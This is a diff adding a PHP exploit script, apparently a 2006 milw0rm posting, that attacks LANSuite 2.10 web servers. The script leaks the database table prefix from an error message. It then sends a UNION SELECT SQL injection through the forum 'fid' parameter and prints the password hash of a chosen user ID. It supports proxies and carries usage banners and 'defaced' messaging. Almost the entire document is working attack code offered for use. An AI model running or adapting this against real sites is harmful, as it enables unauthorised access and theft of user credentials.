@@ -1,0 +1,82 @@
+<?
+error_reporting(E_ERROR);
+
+function xss_init()
+{
+    if (!extension_loaded('php_curl'))
+    {
+       if (!dl('curl.so') and !dl('php_curl.so') and !dl('php_curl.dll'))
+       die ("oo error - cannot load curl extension!");
+    }
+}
+
+function xss_header()
+{
+    echo "\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo";
+    echo "                                  oo    ooooooo     ooooooo\n";
+    echo "                    oooo   oooo o888  o88     888 o888   888o\n";
+    echo "                      888o888    888        o888   888888888\n";
+    echo "                      o88888o    888     o888   o 888o   o888\n";
+    echo "                    o88o   o88o o888o o8888oooo88   88ooo88\n";
+    echo "oooooooooooooooooooooo lansuite 2.10 remote sql injection oooooooooooooooooooooo\n";
+    echo "oo usage          $ php lansuite-210-exploit.php [url] [user id]\n";
+    echo "oo proxy support  $ php lansuite-210-exploit.php [url] [user id] [proxy]:[port]\n";
+    echo "oo example        $ php lansuite-210-exploit.php http://localhost 1\n";
+    echo "oo print the password of the user\n\n";
+}
+
+function xss_bottom()
+{
+    echo "\noo developed for the [myg0t] online gaming group\n";
+    echo "oo discover : x128 - alexander wilhelm - 24/02/2006\n";
+    echo "oo contact  : exploit <at> x128.net                    oo website : www.x128.net";
+}
+
+function xss_exploit()
+{
+    $xss_target = $_SERVER['argv'][1] . "/index.php";
+    $xss_http_prefix_get = "?mod=board&action=forum&fid=x128";
+
+    $xss_connection = curl_init();
+
+    if ($_SERVER['argv'][3])
+    {
+        curl_setopt($xss_connection, CURLOPT_TIMEOUT, 8);
+        curl_setopt($xss_connection, CURLOPT_PROXY, $_SERVER['argv'][3]);
+    }
+
+    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_prefix_get);
+    curl_setopt ($xss_connection, CURLOPT_HEADER, 0);
+    curl_setopt ($xss_connection, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt ($xss_connection, CURLOPT_USERAGENT, 'x128');
+
+    $xss_prefix_source = curl_exec($xss_connection) or die("oo error - cannot connect!\n");
+    
+    $xss_prefix = substr(strstr($xss_prefix_source, "need_type FROM "), 15, strpos(strstr($xss_prefix_source, "need_type FROM "), "board_forums") - 15);
+    
+    $xss_http_get = "?mod=board&action=forum&fid=" . urlencode("0 UNION SELECT 1, 1, 1, 1, 1, 1, password, 1, 1, 1, 1 FROM ". $xss_prefix ."user WHERE userid = ". $_SERVER['argv'][2] ."/*");
+
+    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_get);
+
+    $xss_source = curl_exec($xss_connection) or die("oo error - cannot connect!\n");
+
+    $xss_passwd = substr(strstr($xss_source, "b.userid WHERE pid = "), 21, 32);
+    
+    if ($xss_passwd == "") { $xss_passwd = substr(strstr($xss_source, "Unknown column '"), 16, 32); }
+
+    if ($_SERVER['argv'][2] && $xss_passwd)
+    {
+        echo "oo user           " . $_SERVER['argv'][2] . "\n";
+        echo "oo password       " . $xss_passwd . "\n\n";
+        echo "oo dafaced ...\n";
+    }
+    curl_close ($xss_connection); 
+}
+
+xss_init();
+xss_header();
+xss_exploit();
+xss_bottom();
+?>
+
+# milw0rm.com [2006-02-24]
